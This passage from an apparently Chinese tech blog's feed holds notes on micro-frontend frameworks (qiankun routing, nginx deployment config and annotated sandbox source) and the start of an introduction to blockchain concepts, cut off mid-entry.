    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>微前端: 由微服务衍生而来</li><li>微前端架构中一般会有个容器应用（container application）将各子应用(Bundle)集成起来 <a href="https://zhuanlan.zhihu.com/p/96464401" target="_blank" rel="noopener">^1</a></li><li>多 Bundle 集成方式<ul><li>服务端集成：如服务端渲染SSR</li><li>构建时集成：如Code Splitting<ul><li>常见的构建时集成方式是将子应用发布成独立的 npm 包，共同作为主应用的依赖项，构建生成一个供部署的 JS Bundle。然而，构建时集成最大的问题是会在发布阶段造成耦合，任何一个子应用有变更，都要整个重新编译</li></ul></li><li>运行时集成：如通过 iframe、JS、Web Components 等方式<ul><li>iframe实现缺点：<a href="https://www.yuque.com/kuitos/gky7yw/gesexv" target="_blank" rel="noopener">https://www.yuque.com/kuitos/gky7yw/gesexv</a></li></ul></li></ul></li><li>SPA(SinglePage Web Application)单页应用和MPA(MultiPage Application)多页应用区别参考：<a href="https://juejin.cn/post/6844903512107663368" target="_blank" rel="noopener">https://juejin.cn/post/6844903512107663368</a></li><li>相关资源<ul><li><a href="https://cn.vuejs.org/v2/guide/components-dynamic-async.html" target="_blank" rel="noopener">vue动态组件和异步组件说明</a></li><li><a href="https://github.com/FranckFreiburger/http-vue-loader" target="_blank" rel="noopener">使用http-vue-loader可在非单页应用中引入.vue组件</a></li><li><a href="https://v2ex.com/t/581581" target="_blank" rel="noopener">可插拔式系统讨论</a></li></ul></li><li>TODO<ul><li>父子应用数据同步：<a href="https://blog.csdn.net/weixin_42234168/article/details/112180703" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42234168/article/details/112180703</a></li></ul></li><li>相关框架<ul><li><a href="#qiankun">qiankun</a></li><li><a href="#飞冰icestark">飞冰icestark</a></li><li><a href="https://github.com/aliyun/alibabacloud-alfa" target="_blank" rel="noopener">Alfa</a></li></ul></li></ul><h2 id="qiankun"><a href="#qiankun" class="headerlink" title="qiankun"></a>qiankun</h2><ul><li><a href="https://github.com/umijs/qiankun" target="_blank" rel="noopener">蚂蚁金服qiankun(乾坤)</a></li><li>基于<a href="https://github.com/single-spa/single-spa" target="_blank" rel="noopener">single-spa</a>实现<ul><li>参考：<a href="https://juejin.cn/post/6844903943873675271" target="_blank" rel="noopener">每日优鲜供应链前端基于single-spa改造介绍</a></li><li><a href="https://github.com/joeldenning/coexisting-vue-microfrontends" target="_blank" rel="noopener">基于 vue 示例</a></li><li><a href="https://gitee.com/Janlaywss/vue-single-spa/tree/master" target="_blank" rel="noopener">子项目为 vue &amp; react &amp; angular 结合示例</a></li></ul></li><li>主应用通过<code>history.pushState(state, title[, url])</code>跳转到微应用</li><li>基于Fetch(类似ajax)获取微应用页面，并将其加入到相应DOM(此时是同一个域)，因此微应用可以获取到主应用的所有状态(Cookies/Storeage) <a href="(https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch)">^2</a></li><li>由于主应用和微应用最终输入同源页面，因此所有状态(Cookies/Storeage)共享，对于不想共享的数据可增加key前缀区分</li><li>相关文章<ul><li><a href="https://juejin.cn/post/6889956096501350408" target="_blank" rel="noopener">“巨石应用”的诞生</a></li><li><a href="https://juejin.cn/post/6891888458919641096" target="_blank" rel="noopener">从qiankun看子应用加载</a></li><li><a href="https://juejin.cn/post/6896643767353212935" target="_blank" rel="noopener">从qiankun看沙箱隔离</a></li><li><a href="https://www.cnblogs.com/goloving/p/14881461.html" target="_blank" rel="noopener">微前端架构qiankun常见问题及解决方案</a></li></ul></li></ul><h3 id="多应用部署及路由流程"><a href="#多应用部署及路由流程" class="headerlink" title="多应用部署及路由流程"></a>多应用部署及路由流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 整体流程</span></span><br><span class="line"><span class="comment"># 主应用端点 /sqbiz</span></span><br><span class="line"><span class="comment"># 主应用点击菜单(从后台获取或从本地读取的菜单路径)，如：/sqbiz/module/jxc/xxx(需要加上主应用端点)</span></span><br><span class="line"><span class="comment"># 主应用配置好如果以 /sqbiz/module/ 开头的路径，则跳转到子应用，此时可执行 history.pushState 推送路由</span></span><br><span class="line"><span class="comment"># 主应用执行 router.beforeEach, to.path=/module/jxc/xxx (打印的vue-router的值会自动刨去主应用端点 /sqbiz)</span></span><br><span class="line"><span class="comment"># 此时浏览器路径为 http://localhost/sqbiz/module/jxc/xxx 则触发activeRule路径，从而通过fetch(ajax)请求地址 http://localhost/sqbiz/jxc/xxx (entry路径)</span></span><br><span class="line"><span class="comment"># 主应用执行 qiankun.beforeLoad</span></span><br><span class="line"><span class="comment"># 此时由 nginx 访问到子应用 http://localhost/sqbiz/jxc/xxx</span></span><br><span class="line"><span class="comment"># 子应用执行 main.bootstrap(qiankun)</span></span><br><span class="line"><span class="comment"># 主应用执行 qiankun.beforeMount</span></span><br><span class="line"><span class="comment"># 子应用执行 main.mount(qiankun)</span></span><br><span class="line"><span class="comment"># 子应用执行 router.beforeEach, to.path=/xxx (打印的vue-router的值会自动刨去子应用端点 /sqbiz/module/jxc/，注意此处是基于浏览器地址来的)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## qiankun路由配置</span></span><br><span class="line">registerMicroApps(</span><br><span class="line">    [&#123;</span><br><span class="line">        name: <span class="string">'sqbiz-module-jxc'</span>,</span><br><span class="line">        entry: <span class="string">'/sqbiz/jxc/'</span>,</span><br><span class="line">        container: <span class="string">'#subapp-viewport'</span>,</span><br><span class="line">        activeRule: <span class="string">'/sqbiz/module/jxc'</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        name: <span class="string">'sqbiz-plugin-minions-app'</span>,</span><br><span class="line">        entry: <span class="string">'//localhost/sqbiz/minions/'</span>,</span><br><span class="line">        container: <span class="string">'#subapp-viewport'</span>,</span><br><span class="line">        activeRule: <span class="string">'/sqbiz/plugin/minions'</span></span><br><span class="line">    &#125;],</span><br><span class="line">    callback</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">## 主应用配置</span></span><br><span class="line"><span class="comment"># VUE_APP_PUBLIC_PATH=sqbiz 主应用端点</span></span><br><span class="line"><span class="comment"># vue.config配置</span></span><br><span class="line"><span class="built_in">let</span> publicPath = process.env.VUE_APP_PUBLIC_PATH ? (<span class="string">'/'</span> + process.env.VUE_APP_PUBLIC_PATH + <span class="string">'/'</span>) : <span class="string">'/'</span></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  publicPath: publicPath,</span><br><span class="line">  outputDir: process.env.VUE_APP_PUBLIC_PATH || <span class="string">'dist'</span>, // 会在项目目录创建 sqbiz 产出文件夹</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 路由配置</span></span><br><span class="line">const prefix = process.env.VUE_APP_PUBLIC_PATH ? (<span class="string">'/'</span> + process.env.VUE_APP_PUBLIC_PATH + <span class="string">'/'</span>) : <span class="string">'/'</span></span><br><span class="line">new VueRouter(&#123;</span><br><span class="line">    base: prefix,</span><br><span class="line">    mode: <span class="string">'history'</span>,</span><br><span class="line">    routes: []</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 子应用配置</span></span><br><span class="line"><span class="comment"># VUE_APP_PUBLIC_PATH=sqbiz/jxc 子应用端点</span></span><br><span class="line"><span class="comment"># VUE_APP_QIANKUN_MAIN_BASE=/sqbiz 为主应用的端点，如果在根目录下，留空即可</span></span><br><span class="line"><span class="comment"># vue.config配置</span></span><br><span class="line"><span class="built_in">let</span> publicPath = process.env.VUE_APP_PUBLIC_PATH ? (<span class="string">'/'</span> + process.env.VUE_APP_PUBLIC_PATH + <span class="string">'/'</span>) : <span class="string">'/'</span></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  publicPath: publicPath,</span><br><span class="line">  outputDir: process.env.VUE_APP_PUBLIC_PATH || <span class="string">'dist'</span>, // 会在项目目录创建 sqbiz/jxc 产出文件夹</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 路由配置，注意此处前面需要加主应用的端点</span></span><br><span class="line">const prefix = process.env.VUE_APP_PUBLIC_PATH ? (<span class="string">'/'</span> + process.env.VUE_APP_PUBLIC_PATH + <span class="string">'/'</span>) : <span class="string">'/'</span></span><br><span class="line">new VueRouter(&#123;</span><br><span class="line">    base: window.__POWERED_BY_QIANKUN__ ? process.env.VUE_APP_QIANKUN_MAIN_BASE +  <span class="string">'/module/jxc/'</span> : prefix,</span><br><span class="line">    mode: <span class="string">'history'</span>,</span><br><span class="line">    routes: []</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># nginx配置</span></span><br><span class="line">server &#123;</span><br><span class="line">listen       80;</span><br><span class="line">server_name  localhost;</span><br><span class="line"></span><br><span class="line">gzip on;</span><br><span class="line">gzip_types text/plain application/x-javascript application/javascript text/javascript text/css application/xml text/xml;</span><br><span class="line"></span><br><span class="line">location /sqbiz/api/ &#123;</span><br><span class="line">proxy_pass http://127.0.0.1:8800/api/;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location = /sqbiz/index.html &#123;</span><br><span class="line">add_header Cache-Control <span class="string">"no-cache, no-store"</span>;</span><br><span class="line">root   D:/gitwork/oschina/sqbiz/sqbiz-web/sqbiz-main;</span><br><span class="line">index  index.html index.htm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location = /sqbiz/jxc/index.html &#123;</span><br><span class="line">add_header Cache-Control <span class="string">"no-cache, no-store"</span>;</span><br><span class="line">root   D:/gitwork/oschina/sqbiz/sqbiz-web/sqbiz-module/sqbiz-jxc;</span><br><span class="line">index  index.html index.htm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ^~ /sqbiz/jxc/ &#123;</span><br><span class="line">root   D:/gitwork/oschina/sqbiz/sqbiz-web/sqbiz-module/sqbiz-jxc; <span class="comment"># 子模块 sqbiz-jxc 根目录</span></span><br><span class="line">try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ /sqbiz/jxc/index.html;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$request_filename</span> ~* .*\.(?:htm|html)$) &#123;</span><br><span class="line">add_header Cache-Control <span class="string">"private, no-store, no-cache, must-revalidate, proxy-revalidate"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ^~ /sqbiz/ &#123;</span><br><span class="line">root   D:/gitwork/oschina/sqbiz/sqbiz-web/sqbiz-main; <span class="comment"># 主模块根目录</span></span><br><span class="line">try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ /sqbiz/index.html;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$request_filename</span> ~* .*\.(?:htm|html)$) &#123;</span><br><span class="line">add_header Cache-Control <span class="string">"private, no-store, no-cache, must-revalidate, proxy-revalidate"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    location = / &#123;</span><br><span class="line">        <span class="comment"># rewrite / http://192.168.1.100/sqbiz/ break;</span></span><br><span class="line">        rewrite / http://<span class="variable">$server_name</span>/sqbiz/ <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="沙箱隔离"><a href="#沙箱隔离" class="headerlink" title="沙箱隔离"></a>沙箱隔离</h3><ul><li>由于主应用和子应用在同一个窗口，因此不进行沙箱隔离，则主子应用访问到同一个window，可能导致数据混乱</li><li>qiankun 做沙箱隔离主要分为三种：legacySandBox、proxySandBox、snapshotSandBox</li><li>其中 legacySandBox、proxySandBox 是基于 Proxy API 来实现的，在不支持 Proxy API 的低版本浏览器中，会降级为 snapshotSandBox。在现版本中，legacySandBox 仅用于 singular 单实例模式，而多实例模式会使用 proxySandBox</li><li><a href="https://github.com/umijs/qiankun/blob/v2.4.0/src/sandbox/proxySandbox.ts" target="_blank" rel="noopener">proxySandbox</a></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createFakeWindow</span>(<span class="params">global: Window</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对于non-configurable且有getter类型的参数单独放置在Map中，读取时效率更高(其实fakeWindow中也存在)，如document(父子应用共享)</span></span><br><span class="line">    <span class="keyword">const</span> propertiesWithGetter = <span class="keyword">new</span> <span class="built_in">Map</span>&lt;PropertyKey, boolean&gt;();</span><br><span class="line">    <span class="comment">// 虚拟一个window对象，如进入子应用则是使用的此对象</span></span><br><span class="line">    <span class="keyword">const</span> fakeWindow = &#123;&#125; <span class="keyword">as</span> FakeWindow;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy the non-configurable property of global to fakeWindow</span></span><br><span class="line">    <span class="comment">// 如 top/self/window/document 等是全局共享的</span></span><br><span class="line">    <span class="comment">// make top/self/window property configurable and writable, otherwise it will cause TypeError while get trap return.</span></span><br><span class="line">    <span class="comment">// 将 top/self/window 设置成 configurable 和 writable，否则通过 Proxy 进行 getOwnPropertyDescriptor 代理时会报错</span></span><br><span class="line">    <span class="built_in">Object</span>.getOwnPropertyNames(global).filter(...).forEach(...)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        fakeWindow,</span><br><span class="line">        propertiesWithGetter,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每次进入微应用会实例化 ProxySandbox, 重新创建虚拟window</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxySandbox</span> <span class="title">implements</span> <span class="title">SandBox</span> </span>&#123;</span><br><span class="line">    <span class="comment">// window 值变更记录</span></span><br><span class="line">    private updatedValueSet = <span class="keyword">new</span> <span class="built_in">Set</span>&lt;PropertyKey&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 激活沙箱</span></span><br><span class="line">    active() &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.sandboxRunning) activeSandboxCount++;</span><br><span class="line">        <span class="keyword">this</span>.sandboxRunning = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注销沙箱</span></span><br><span class="line">    inactive() &#123;</span><br><span class="line">        <span class="keyword">if</span> (process.env.NODE_ENV === <span class="string">'development'</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.info(<span class="string">`[qiankun:sandbox] <span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> modified global properties restore...`</span>, [</span><br><span class="line">                ...this.updatedValueSet.keys(),</span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(name: string) &#123;</span><br><span class="line">        <span class="comment">// 原始window，即主应用window</span></span><br><span class="line">        <span class="keyword">const</span> rawWindow = <span class="built_in">window</span>;</span><br><span class="line">        <span class="comment">// 创建虚拟window</span></span><br><span class="line">        <span class="keyword">const</span> &#123; fakeWindow, propertiesWithGetter &#125; = createFakeWindow(rawWindow);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> proxy = <span class="keyword">new</span> <span class="built_in">Proxy</span>(fakeWindow, &#123;</span><br><span class="line">            set: (target: FakeWindow, <span class="attr">p</span>: PropertyKey, <span class="attr">value</span>: any): <span class="function"><span class="params">boolean</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.sandboxRunning) &#123;</span><br><span class="line">                    <span class="comment">// We must kept its description while the property existed in rawWindow before</span></span><br><span class="line">                    <span class="keyword">if</span> (!target.hasOwnProperty(p) &amp;&amp; rawWindow.hasOwnProperty(p)) &#123;</span><br><span class="line">                        <span class="comment">// 原window中有的，且虚拟window中不存在的。此时如果修改，则是直接修改的原window，需要判断是否为 writable</span></span><br><span class="line">                        <span class="keyword">const</span> descriptor = <span class="built_in">Object</span>.getOwnPropertyDescriptor(rawWindow, p);</span><br><span class="line">                        <span class="keyword">const</span> &#123; writable, configurable, enumerable &#125; = descriptor!;</span><br><span class="line">                        <span class="keyword">if</span> (writable) &#123;</span><br><span class="line">                            <span class="built_in">Object</span>.defineProperty(target, p, &#123;</span><br><span class="line">                                configurable,</span><br><span class="line">                                enumerable,</span><br><span class="line">                                writable,</span><br><span class="line">                                value,</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 虚拟window中存在的，或原window不存在的，全部保存到虚拟window中</span></span><br><span class="line">                        target[p] = value;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 对于白名单中的全局变量，可直接修改原window的值</span></span><br><span class="line">                    <span class="keyword">if</span> (variableWhiteList.indexOf(p) !== <span class="number">-1</span>) &#123;</span><br><span class="line">                        rawWindow[p] = value;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 将修改过的全局变量保存，注销时会打印出来</span></span><br><span class="line">                    updatedValueSet.add(p);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">this</span>.latestSetProp = p;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 取值：propertiesWithGetter &gt; 模拟window &gt; 原始window</span></span><br><span class="line">            get(target: FakeWindow, <span class="attr">p</span>: PropertyKey): any &#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ul><li>报错：Application died in status LOADING_SOURCE_CODE: You need to export the functional lifecycles in xxx entry<ul><li>参考：<a href="https://qiankun.umijs.org/zh/faq" target="_blank" rel="noopener">https://qiankun.umijs.org/zh/faq</a></li><li>有可能vue.config.js配置的入口函数存在问题，没有将main.js写成入口函数的最后一个文件，参考<a href="/_posts/web/webpack.md#复杂案例">webpack.md#复杂案例</a></li></ul></li><li>子项目不支持动态路由(动态从服务端获取路由配置，通过addRoutes加入路由)，基于vue暂未找到方案。<a href="https://www.yuque.com/blueju/blog/uxlrlr" target="_blank" rel="noopener">https://www.yuque.com/blueju/blog/uxlrlr</a></li></ul><h2 id="icestark飞冰"><a href="#icestark飞冰" class="headerlink" title="icestark飞冰"></a>icestark飞冰</h2><ul><li><a href="https://github.com/ice-lab/icestark" target="_blank" rel="noopener">飞冰icestark</a>，为飞冰(ice生态的一个微前端解决方案</li><li>主应用和微应用皆支持 React/Vue/Angular… 等不同框架</li><li>支持VSCode拖拽组件</li></ul><hr><p>参考文章</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;微前端: 由微服务衍生而来&lt;/li&gt;
&lt;li&gt;微前端架构中一般会有个容器应用（container application）将各子
      
    
    </summary>
    
      <category term="web" scheme="http://blog.aezo.cn/categories/web/"/>
    
    
      <category term="vue" scheme="http://blog.aezo.cn/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>区块链</title>
    <link href="http://blog.aezo.cn/2021/02/26/arch/blockchain/"/>
    <id>http://blog.aezo.cn/2021/02/26/arch/blockchain/</id>
    <published>2021-02-26T10:34:00.000Z</published>
    <updated>2022-10-23T13:30:23.134Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>区块链（Blockchain）：它是一种特殊的分布式数据库 <a href="https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html" title="区块链入门教程" target="_blank" rel="noopener">^1</a><ul><li>区块链没有管理员，它是彻底无中心的</li><li>区块链由一个个区块（block）组成，区块由区块头（Head）和区块体（Body）组成<ul><li>区块头保存当前区块的特征值：当前时间、上一个区块的Hash、当前区块体Hash、Nonce(随机项，工作量证明，计算正确hash值的次数)等</li><li>区块体保存实际数据，大小为1M</li></ul></li><li>每个块类似链表进行连接（下一个区块记录了上一个区块的区块头Hash）</li></ul></li><li>挖矿<ul><li>通过大量计算，将数据成功写入到区块链中即是采矿。每次写入数据，就是创建一个区块</li><li>新的有效区块规则<ul><li><code>目标值 = 一个常量 / 难度系数</code>。难度系数越大，目标值就越小</li><li>只有小于目标值的哈希才是有效的，否则哈希无效，必须重算</li><li>通过改变Nonce值(一般只能用穷举，最大可以到21.47亿)，从而时区块头数据改变，从而计算出不同的Hash，直到找到正确的Hash；如果穷举到Nonce到最大，协议允许矿工改变区块体，开始新的计算</li><li>难度系数的动态调节：中本聪设计了难度系数的动态调节机制，将产出速率趋于十分钟每个</li></ul></li><li>区块链的分叉<ul><li>新节点总是采用最长的那条区块链。如果区块链有分叉，将看哪个分支在分叉点后面，先达到6个新区块（称为”六次确认”）。按照10分钟一个区块计算，一小时就可以确认，因此比特币交易一般有1小时左右的延迟</li></ul></li><li>比特币挖矿为什幺烧显卡: <a href="http://www.elecfans.com/xinkeji/611328.html" target="_blank" rel="noopener">http://www.elecfans.com/xinkeji/611328.html</a></li></ul></li><li>挖矿的人叫矿工，挖矿的机器叫矿机/工人</li><li>矿池<ul><li>即多人合作挖矿，获得的比特币奖励也由多人依照贡献度分享</li><li>矿池费率计算方式：PPS、PPS+、FPPS、PPLNS、SOLO</li></ul></li><li>钱包<ul><li>热钱包类似股票的交易账户，冷钱包就像管理证券账户的银行</li><li>如币安有一个现货账户(可直接购买各种数字货币)，和一个C2C账户(用户和用户直接进行银行卡-法定数字货币交易)</li></ul></li><li>交易所<ul><li><a href="https://www.binance.com/zh-CN" target="_blank" rel="noopener">币安</a>，参考: <a href="http://www.pc6.com/infoview/Article_188310.html" target="_blank" rel="noopener">http://www.pc6.com/infoview/Article_188310.html</a></li></ul></li><li>参考文章<ul><li><a href="https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html" target="_blank" rel="noopener">区块链入门教程</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html" target="_blank" rel="noopener">比特币入门教程</a></li><li><a href="https://www.codenong.com/cs106604338/" target="_blank" rel="noopener">基于java开发一套简易的区块链系统</a></li><li><a href="https://1234btc.com/" target="_blank" rel="noopener">数字货币导航</a></li></ul></li></ul><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><ul><li>区块链分类 <a href="https://www.codenong.com/cs106604338/" title="基于java开发一套完整的区块链系统详细教程" target="_blank" rel="noopener">^4</a><ul><li><code>公有链</code><ul><li>世界上任何个体或者团体都可以接入，发送交易。公有区块链是最早的区块链，例如<code>BTC</code>、<code>以太坊</code>等虚拟数字货币均基于公有区块链</li><li>如果把比特币网络看作是一套分布式的数据库，而以太坊则更进一步，它可以看作是一台分布式的计算机：区块链是计算机的ROM，合约是程序，而以太坊的矿工们则负责计算，担任CPU的角色</li><li><code>以太坊</code>作为平台可以在其上开发新的应用，单平台性能不足，经常出现网络拥堵的情况，可用来学习开发与测试</li></ul></li><li><code>联盟链</code><ul><li>由某个群体内部指定多个预选的节点为记账人，每个块的生成由所有的预选节点共同决定（预选节点参与共识过程），其他接入节点可以参与交易，但有权限限制，信息受保护，如银联组织</li><li>联盟链拥有区块链技术的大部分特征，并且在权限管理、数据安全、监管方面更有优势，是企业优先考虑的区块链技术方案</li><li><code>Hyperledger Fabric</code> 也叫<code>超级账本</code>，它是 IBM 贡献给 Linux 基金会的商用分布式账本，是面向企业应用的全球最大的分布式开源项目</li><li>国内一些大的软件厂商也都有自己的企业区块链技术解决方案，例如<code>蚂蚁金服区块链平台</code>，腾讯的<code>TrustSQL</code>平台，东软的<code>SaCa EchoTrust</code>区块链应用平台以及<code>京东区块链防伪追溯平台</code>等等</li></ul></li><li><code>私有链</code><ul><li>仅仅使用区块链的总账技术进行记账，可以是一个公司，也可以是个人，独享该区块链的写入权限，利用区块链的不易篡改特性，把区块链作为账本数据库来使用</li></ul></li></ul></li><li>共识机制 <a href="https://www.codenong.com/cs106604338/" title="基于java开发一套完整的区块链系统详细教程" target="_blank" rel="noopener">^4</a><ul><li>是通过特殊节点的投票，在很短的时间内完成对交易的验证和确认，对一笔交易，如果利益不相干的若干个节点能够达成共识，我们就可以认为全网对此也能够达成共识</li><li>目前，较为主流的共识算法有PoW、PoS、DPoS、PBFT等，在实际使用时，每种算法都有各自的优点和缺点</li><li>PoW：工作量证明（Proof of Work），顾名思义就是对工作量的证明。BTC网络使用此算法(穷举Nonce值以找到正确Hash)</li></ul></li><li>智能合约<ul><li>智能合约是一段部署在在区块链上的程序代码，当满足程序设定的条件时，它便会在区块链上运行，并得到相应的结果</li><li>这种情况有点类似于微信的小程序，区块链提供虚拟机和脚本语言，用户根据脚本语言的语法开发带有一定业务逻辑的程序，部署在区块链上，当满足执行的条件时，智能合约便会被区块链虚拟机解释并运行</li><li>典型的应用便是以太坊平台的智能合约，在这个平台里可以支持用户通过简单的几行代码就能实现他们想要的合约，实现无需人为监督的、不可篡改、自动化运行的合约</li></ul></li></ul><h2 id="相关开源项目"><a href="#相关开源项目" class="headerlink" 